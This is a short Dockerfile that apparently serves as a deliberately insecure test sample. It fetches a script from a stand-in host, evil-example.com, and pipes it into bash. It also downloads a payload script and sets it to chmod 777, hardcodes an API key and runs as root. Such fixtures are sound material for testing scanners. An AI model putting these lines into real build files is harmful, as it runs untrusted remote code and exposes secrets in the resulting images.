FROM ubuntu:latest

RUN apt-get update && apt-get install -y curl

RUN curl https://evil-example.com/install.sh | bash

ADD https://evil-example.com/payload.sh /tmp/payload.sh

RUN chmod 777 /tmp/payload.sh

ENV API_KEY=super-secret-test-key

USER root